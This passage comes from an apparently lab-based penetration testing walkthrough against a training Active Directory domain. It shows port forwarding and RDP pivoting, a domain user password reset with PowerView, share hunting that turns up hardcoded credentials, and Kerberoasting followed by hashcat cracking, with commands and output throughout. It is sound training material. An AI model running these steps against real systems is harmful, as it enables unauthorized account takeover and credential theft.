Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.30</span> seconds
</code></pre>
<p>To achieve this, we can use another SSH port forwarding command, this type <code>Local Port Forwarding</code>. The command allows us to pass all RDP traffic to <code>DEV01</code> through the <code>dmz01</code> host via local port 13389.</p>
<p>Lateral Movement</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">ssh</span> <span class="hljs-selector-tag">-i</span> <span class="hljs-selector-tag">dmz01_key</span> <span class="hljs-selector-tag">-L</span> 13389<span class="hljs-selector-pseudo">:172.16.8.20</span><span class="hljs-selector-pseudo">:3389</span> <span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">10</span>.<span class="hljs-keyword">129</span>.<span class="hljs-keyword">203</span>.<span class="hljs-keyword">111</span>
</code></pre>
<p>Once this port forward is set up, we can use <code>xfreerdp</code> to connect to the host using drive redirection to transfer files back and forth easily.</p>
<p>Lateral Movement</p>
<pre><code class="lang-shell-session">xfreerdp <span class="hljs-regexp">/v:127.0.0.1:13389 /</span><span class="hljs-string">u:</span>hporter <span class="hljs-regexp">/p:Gr8hambino! /</span><span class="hljs-string">drive:</span>home,<span class="hljs-string">"/home/tester/tools"</span>
</code></pre>
<p>We notice that we only get console access as this server does not have the the Desktop Experience role installed, but all we need is a console. We can type <code>net use</code> to view the location of our redirected drive and then transfer the tool over.</p>
<p>Lateral Movement</p>
<pre><code class="lang-cmd-session">c:<span class="hljs-symbol">\D</span>otNetNuke<span class="hljs-symbol">\P</span>ortals<span class="hljs-symbol">\0</span>&gt; net use

New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       <span class="hljs-symbol">\\</span>TSCLIENT<span class="hljs-symbol">\h</span>ome           Microsoft Terminal Services
The command completed successfully.


c:<span class="hljs-symbol">\D</span>otNetNuke<span class="hljs-symbol">\P</span>ortals<span class="hljs-symbol">\0</span>&gt; copy <span class="hljs-symbol">\\</span>TSCLIENT<span class="hljs-symbol">\h</span>ome<span class="hljs-symbol">\P</span>owerView.ps1 .
        1 file(s) copied.
</code></pre>
<p>Next, type <code>powershell</code> to drop into a PowerShell console, and we can use <code>PowerView</code> to change the <code>ssmalls</code> user&#39;s password as follows:</p>
<p>Lateral Movement</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\PowerView.ps1

PS <span class="hljs-keyword">C</span>:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; <span class="hljs-keyword">Set</span>-DomainUserPassword -<span class="hljs-keyword">Identity</span> ssmalls -AccountPassword (ConvertTo-SecureString <span class="hljs-string">'Str0ngpass86!'</span> -AsPlainText -Force ) -<span class="hljs-keyword">Verbose</span>

VERBOSE: [<span class="hljs-keyword">Set</span>-DomainUserPassword] Attempting to set the password for user <span class="hljs-string">'ssmalls'</span>
VERBOSE: [<span class="hljs-keyword">Set</span>-DomainUserPassword] Password for user <span class="hljs-string">'ssmalls'</span> successfully reset
</code></pre>
<p>We can switch back to our attack host and confirm that the password was changed successfully. Generally, we would want to avoid this type of activity during a penetration test, but if it&#39;s our only path, we should confirm with our client. Most will ask us to proceed so they can see how far the path will take us, but it&#39;s always best to ask. We want to, of course, note down any changes like this in our activity log so we can include them in an appendix of our report.</p>
<p>Lateral Movement</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains crackmapexec smb <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span> -u ssmalls -p Str0ngpass86!

ProxyChains<span class="hljs-number">-3.1</span> (http:<span class="hljs-comment">//proxychains.sf.net)</span>
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">135</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
SMB         <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-literal">False</span>)
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
SMB         <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86!
</code></pre>
<hr>
<h2 id="share-hunting">Share Hunting</h2>
<p>Digging around the host and AD some more, we don&#39;t see much of anything useful. BloodHound does not show anything interesting for the <code>ssmalls</code> user. Turning back to the <code>Penetration Tester Path</code> content, we remember that both the <a href="https://academy.hackthebox.com/module/143/section/1421">Credentialed Enumeration from Windows</a> and the <a href="https://academy.hackthebox.com/module/143/section/1269">Credentialed Enumeration from Linux</a> sections covered hunting file shares with Snaffler and CrackMapExec respectively. There have been many times on penetration tests where I have had to turn to digging through file shares to find a piece of information, such as a password for a service account or similar. I have often been able to access departmental shares (such as IT) with low privileged credentials due to weak NTFS permissions. Sometimes I can even access shares for some or all users in the target company due to the same issue. Frequently users are unaware that their home drive is a mapped network share and not a local folder on their computer, so they may save all sorts of sensitive data there. File share permissions are very difficult to maintain, especially in large organizations. I have found myself digging through file shares often during penetration tests when I am stuck. I can think of one specific pentest where I had user credentials but was otherwise stuck for a few days and resorted to digging through shares. After a while, I found a <code>web.config</code> file that contained valid credentials for an MSSQL service account. This gave me local admin rights on a SQL server where a Domain Admin was logged in, and it was game over. Other times I have found files containing passwords on user drives that have helped me move forward. Depending on the organization and how their file permissions are set up, there can be a lot to wade through and tons of &quot;noise.&quot; A tool like Snaffler can help us navigate that and focus on the most important files and scripts. Let&#39;s try that here.</p>
<p>First, let&#39;s run <a href="https://github.com/SnaffCon/Snaffler">Snaffler</a> from our RDP session as the <code>hporter</code> user.</p>
<p>Share Hunting</p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">c:</span>\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; copy \\TSCLIENT\home\Snaffler.exe
        <span class="hljs-number">1</span> file(s) copied.

<span class="hljs-symbol">c:</span>\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 .<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.    <span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.  <span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.    .-<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:<span class="hljs-string">'.-:::::'</span></span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>:    .,<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>: <span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;<span class="hljs-string">''</span><span class="hljs-string">''</span> ;;;<span class="hljs-string">''</span><span class="hljs-string">''</span> ;;;    ;;;;<span class="hljs-string">''</span><span class="hljs-string">''</span> ;;;;``;;;;
<span class="hljs-string">'[==/[[[[, [[[[[. '</span>[[ ,[[ <span class="hljs-string">'[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['</span>
  <span class="hljs-string">''</span><span class="hljs-string">'    $ $$$ '</span>Y<span class="hljs-variable">$c</span><span class="hljs-variable">$$</span>c<span class="hljs-variable">$$</span><span class="hljs-variable">$cc</span><span class="hljs-variable">$$</span><span class="hljs-variable">$c</span>`<span class="hljs-variable">$$</span><span class="hljs-variable">$'</span>`` `<span class="hljs-variable">$$</span><span class="hljs-variable">$'</span>`` <span class="hljs-variable">$$</span><span class="hljs-string">'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '</span><span class="hljs-number">88</span>bo,
  <span class="hljs-string">'YMmMY'</span>  MMM     YM YMM   <span class="hljs-string">''</span>` <span class="hljs-string">'MM,    '</span>MM,  <span class="hljs-string">''</span><span class="hljs-string">''</span>YUMMM<span class="hljs-string">''</span><span class="hljs-string">''</span>YUMMMMMMM   <span class="hljs-string">'W'</span>
                         by l0ss <span class="hljs-keyword">and</span> Sh3r4 - github.com/SnaffCon/Snaffler


<span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">22</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">57</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span> -<span class="hljs-number">07</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> [Share] {Green}(\\DC01.INLANEFREIGHT.LOCAL\Department Shares)
<span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">22</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">57</span><span class="hljs-symbol">:</span><span class="hljs-number">36</span> -<span class="hljs-number">07</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\ADMIN<span class="hljs-variable">$)</span>
<span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">22</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">57</span><span class="hljs-symbol">:</span><span class="hljs-number">36</span> -<span class="hljs-number">07</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\C<span class="hljs-variable">$)</span>
Press any key to exit.
</code></pre>
<p>This doesn&#39;t turn up anything interesting, so let&#39;s re-run our share enumeration as the <code>ssmalls</code> user. Users can often have different permissions, so share enumeration should be considered an iterative process. To avoid having to RDP again, we can use the <code>CrackMapExec</code> <a href="https://mpgn.gitbook.io/crackmapexec/smb-protocol/spidering-shares">spider_plus</a> module to dig around.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains crackmapexec smb <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span> -u ssmalls -p Str0ngpass86! -M spider_plus --share <span class="hljs-string">'Department Shares'</span>

ProxyChains<span class="hljs-number">-3.1</span> (http:<span class="hljs-comment">//proxychains.sf.net)</span>
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">135</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
SMB         <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-literal">False</span>)
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
SMB         <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86! 
SPIDER_P... <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [*] Started spidering plus <span class="hljs-keyword">with</span> option:
SPIDER_P... <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [*]        DIR: [<span class="hljs-string">'print$'</span>]
SPIDER_P... <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [*]        EXT: [<span class="hljs-string">'ico'</span>, <span class="hljs-string">'lnk'</span>]
SPIDER_P... <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [*]       SIZE: <span class="hljs-number">51200</span>
SPIDER_P... <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [*]     OUTPUT: /tmp/cme_spider_plus
</code></pre>
<p>This creates a file for us in our <code>/tmp</code> directory so let&#39;s look through it.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ cat <span class="hljs-number">172.16.8.3</span>.json 
{
    <span class="hljs-string">"Department Shares"</span>: {
        <span class="hljs-string">"IT/Private/Development/SQL Express Backup.ps1"</span>: {
            <span class="hljs-string">"atime_epoch"</span>: <span class="hljs-string">"2022-06-01 14:34:16"</span>,
            <span class="hljs-string">"ctime_epoch"</span>: <span class="hljs-string">"2022-06-01 14:34:16"</span>,
            <span class="hljs-string">"mtime_epoch"</span>: <span class="hljs-string">"2022-06-01 14:35:16"</span>,
            <span class="hljs-string">"size"</span>: <span class="hljs-string">"3.91 KB"</span>
        }
    },
    <span class="hljs-string">"IPC$"</span>: {
        <span class="hljs-string">"323a2fd620dcf3e3"</span>: {
            <span class="hljs-string">"atime_epoch"</span>: <span class="hljs-string">"1600-12-31 19:03:58"</span>,
            <span class="hljs-string">"ctime_epoch"</span>: <span class="hljs-string">"1600-12-31 19:03:58"</span>,
            <span class="hljs-string">"mtime_epoch"</span>: <span class="hljs-string">"1600-12-31 19:03:58"</span>,
            <span class="hljs-string">"size"</span>: <span class="hljs-string">"3 Bytes"</span>
&lt;SNIP&gt;
</code></pre>
<p>The file <code>SQL Express Backup.ps1</code> in the private IT share looks very interesting. Let&#39;s download it using <code>smbclient</code>. First, we need to connect.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-&lt;&gt;-127.0.0.1:8083-&lt;&gt;&lt;&gt;-172.16.8.3:445-&lt;&gt;&lt;&gt;-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:34:06 2022
  ..                                  D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:34:06 2022
  Accounting                          D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:34:08 2022
  Executives                          D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:34:04 2022
  Finance                             D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:34:00 2022
  HR                                  D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:33:48 2022
  IT                                  D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:33:42 2022
  Marketing                           D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:33:56 2022
  R&amp;D                                 D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:33:52 2022

       <span class="hljs-number"> 10328063 </span>blocks of size 4096.<span class="hljs-number"> 8177952 </span>blocks available
</code></pre>
<p>Then we can browse to the <code>Development</code> share.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">smb: <span class="hljs-tag">\<span class="hljs-name">IT</span></span><span class="hljs-tag">\<span class="hljs-name">Private</span></span><span class="hljs-tag">\<span class="hljs-name">&gt;</span></span> cd Development<span class="hljs-tag">\<span class="hljs-name">
</span></span>smb: <span class="hljs-tag">\<span class="hljs-name">IT</span></span><span class="hljs-tag">\<span class="hljs-name">Private</span></span><span class="hljs-tag">\<span class="hljs-name">Development</span></span><span class="hljs-tag">\<span class="hljs-name">&gt;</span></span> ls
  .                                   D        0  Wed Jun  1 14:34:17 2022
  ..                                  D        0  Wed Jun  1 14:34:17 2022
  SQL Express Backup.ps1              A     4001  Wed Jun  1 14:34:15 2022

        10328063 blocks of size 4096. 8177952 blocks available
smb: <span class="hljs-tag">\<span class="hljs-name">IT</span></span><span class="hljs-tag">\<span class="hljs-name">Private</span></span><span class="hljs-tag">\<span class="hljs-name">Development</span></span><span class="hljs-tag">\<span class="hljs-name">&gt;</span></span> get SQL Express Backup.ps1 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file <span class="hljs-tag">\<span class="hljs-name">IT</span></span><span class="hljs-tag">\<span class="hljs-name">Private</span></span><span class="hljs-tag">\<span class="hljs-name">Development</span></span><span class="hljs-tag">\<span class="hljs-name">SQL</span></span>
smb: <span class="hljs-tag">\<span class="hljs-name">IT</span></span><span class="hljs-tag">\<span class="hljs-name">Private</span></span><span class="hljs-tag">\<span class="hljs-name">Development</span></span><span class="hljs-tag">\<span class="hljs-name">&gt;</span></span> get "SQL Express Backup.ps1" 
getting file <span class="hljs-tag">\<span class="hljs-name">IT</span></span><span class="hljs-tag">\<span class="hljs-name">Private</span></span><span class="hljs-tag">\<span class="hljs-name">Development</span></span><span class="hljs-tag">\<span class="hljs-name">SQL</span></span> Express Backup.ps1 of size 4001 as SQL Express Backup.ps1 (8.7 KiloBytes/sec) (average 8.7 KiloBytes/sec)
</code></pre>
<p>Checking out the file, we see that it&#39;s some sort of backup script with hardcoded credentials for the <code>backupadm</code>, another keyboard walk password. I&#39;m noticing a trend in this organization. Perhaps the same admin set it as the one that set the password we brute-forced with <code>Hydra</code> earlier since this is related to development.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat SQL\ Express\ Backup.ps1 

$serverName = <span class="hljs-string">".\SQLExpress"</span>
$backupDirectory = <span class="hljs-string">"D:\backupSQL"</span>
$daysToStoreDailyBackups = <span class="hljs-number">7</span>
$daysToStoreWeeklyBackups = <span class="hljs-number">28</span>
$monthsToStoreMonthlyBackups = <span class="hljs-number">3</span>

[System.Reflection.Assembly]::LoadWithPartialName(<span class="hljs-string">"Microsoft.SqlServer.SMO"</span>) | Out-<span class="hljs-keyword">Null</span>
[System.Reflection.Assembly]::LoadWithPartialName(<span class="hljs-string">"Microsoft.SqlServer.SmoExtended"</span>) | Out-<span class="hljs-keyword">Null</span>
[System.Reflection.Assembly]::LoadWithPartialName(<span class="hljs-string">"Microsoft.SqlServer.ConnectionInfo"</span>) | Out-<span class="hljs-keyword">Null</span>
[System.Reflection.Assembly]::LoadWithPartialName(<span class="hljs-string">"Microsoft.SqlServer.SmoEnum"</span>) | Out-<span class="hljs-keyword">Null</span>

$mySrvConn = <span class="hljs-keyword">new</span>-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = <span class="hljs-string">"backupadm"</span>
$mySrvConn.Password = <span class="hljs-string">"&lt;REDACTED&gt;"</span>

$server = <span class="hljs-keyword">new</span>-object Microsoft.SqlServer.Management.SMO.Server($mySrvConn)
</code></pre>
<p>Before trying to use this account somewhere, let&#39;s dig around a bit more. There is an interesting .vbs file on the SYSVOL share, which is accessible to all Domain Users.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">     },
       <span class="hljs-string">"INLANEFREIGHT.LOCAL/scripts/adum.vbs"</span>: {
           <span class="hljs-string">"atime_epoch"</span>: <span class="hljs-string">"2022-06-01 14:34:41"</span>,
           <span class="hljs-string">"ctime_epoch"</span>: <span class="hljs-string">"2022-06-01 14:34:41"</span>,
           <span class="hljs-string">"mtime_epoch"</span>: <span class="hljs-string">"2022-06-01 14:34:39"</span>,
           <span class="hljs-string">"size"</span>: <span class="hljs-string">"32.15 KB"</span>
</code></pre>
<p>We can download it once again with <code>smbclient</code>.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/sysvol' 

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-&lt;&gt;-127.0.0.1:8083-&lt;&gt;&lt;&gt;-172.16.8.3:445-&lt;&gt;&lt;&gt;-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:10:57 2022
  ..                                  D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:10:57 2022
  INLANEFREIGHT.LOCAL                Dr       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:10:57 2022
smb: \INLANEFREIGHT.LOCAL\&gt; cd scripts
smb: \INLANEFREIGHT.LOCAL\scripts\&gt; ls
  .                                   D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:34:41 2022
  ..                                  D       <span class="hljs-number"> 0 </span> Wed Jun <span class="hljs-number"> 1 </span>14:34:41 2022
  adum.vbs                            A   <span class="hljs-number"> 32921 </span> Wed Jun <span class="hljs-number"> 1 </span>14:34:39 2022

       <span class="hljs-number"> 10328063 </span>blocks of size 4096.<span class="hljs-number"> 8177920 </span>blocks available
smb: \INLANEFREIGHT.LOCAL\scripts\&gt; get adum.vbs 
getting file \INLANEFREIGHT.LOCAL\scripts\adum.vbs of size<span class="hljs-number"> 32921 </span>as adum.vbs (57.2 KiloBytes/sec) (average 57.2 KiloBytes/sec)
</code></pre>
<p>Digging through the script we find another set of credentials: <code>helpdesk:L337^p@$$w0rD</code></p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat adum.vbs 

<span class="hljs-keyword">Option</span> <span class="hljs-keyword">Explicit</span>

<span class="hljs-comment">''=================================================================================================================================</span>
<span class="hljs-comment">''</span>
<span class="hljs-comment">'' Active Directory User Management script [ADUM]</span>
<span class="hljs-comment">''</span>
<span class="hljs-comment">'' Written: 2011/07/18</span>
<span class="hljs-comment">'' Updated: 2015.07.21</span>

&lt;SNIP&gt;

<span class="hljs-keyword">Const</span> cSubject = <span class="hljs-string">"Active Directory User Management report"</span>    <span class="hljs-comment">'EMAIL - SUBJECT LINE</span>

<span class="hljs-comment">''Most likely not needed, but if needed to pass authorization for connecting and sending emails</span>
<span class="hljs-keyword">Const</span> cdoUserName = <span class="hljs-string">"account@inlanefreight.local"</span>    <span class="hljs-comment">'EMAIL - USERNAME - IF AUTHENTICATION REQUIRED</span>
<span class="hljs-keyword">Const</span> cdoPassword = <span class="hljs-string">"L337^p@$$w0rD"</span>
</code></pre>
<p>Checking in BloodHound, we do not find a <code>helpdesk</code> user, so this may just be an old password. Based on the year in the script comments, it likely is. We can still add this to our findings regarding sensitive data on file shares and note it down in the credentials section of our project notes. Sometimes we will find old passwords that are still being used for old service accounts that we can use for a password spraying attack.</p>
<hr>
<h3 id="kerberoasting">Kerberoasting</h3>
<p>To cover all our bases, let&#39;s check if there are any Kerberoastable users. We can do this via Proxychains using <code>GetUserSPNs.py</code> or <code>PowerView</code>. In our RDP session, we&#39;ll load PowerView and enumerate Service Principal Name (SPN) accounts.</p>
<p>Share Hunting</p>
<pre><code class="lang-powershell-session">PS C:\DotNetNuke\Portals\0&gt; Import-Module .\PowerView.ps1
PS C:\DotNetNuke\Portals\0&gt; Get-DomainUser * -SPN |Select samaccountname

<span class="hljs-section">samaccountname
--------------</span>
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc<span class="hljs-emphasis">_sql
sqlprod
sapsso
sapvc
vmwarescvc</span>
</code></pre>
<p>There are quite a few. Let&#39;s export these to a CSV file for offline processing.</p>
<p>Share Hunting</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
<span class="hljs-symbol">
VERBOSE:</span> [Get-DomainSearcher] search <span class="hljs-string">base:</span> <span class="hljs-string">LDAP:</span><span class="hljs-comment">//DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL</span>
<span class="hljs-string">VERBOSE:</span> [Get-DomainUser] Searching <span class="hljs-keyword">for</span> non-<span class="hljs-literal">null</span> service principal names
<span class="hljs-string">VERBOSE:</span> [Get-DomainUser] filter <span class="hljs-string">string:</span> (&amp;(samAccountType=<span class="hljs-number">805306368</span>)(|(samAccountName=*))(servicePrincipalName=*))
</code></pre>
<p>We can download this file via the RDP drive redirection we set up earlier: <code>copy .\ilfreight_spns.csv \\Tsclient\Home</code>. Open up the .csv file using LibreOffice Calc or Excel and pull out the hashes and add them to a file. We can now run them through Hashcat to see if we can crack any and, if so, if they are for privileged accounts.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ hashcat -m <span class="hljs-number">13100</span> ilfreight_spns /usr/share/wordlists/rockyou.txt

hashcat (v6<span class="hljs-number">.1</span><span class="hljs-number">.1</span>) starting...

&lt;SNIP&gt;

$krb5tgs$23$*backupjob$INLANEFREIGHT.<span class="hljs-keyword">LOCAL</span>$backupjob/veam001.inlanefreight.<span class="hljs-keyword">local</span>*$31b8f218c848bd851df59641a45&lt;SNIP&gt;:&lt;redacted&gt;
</code></pre>
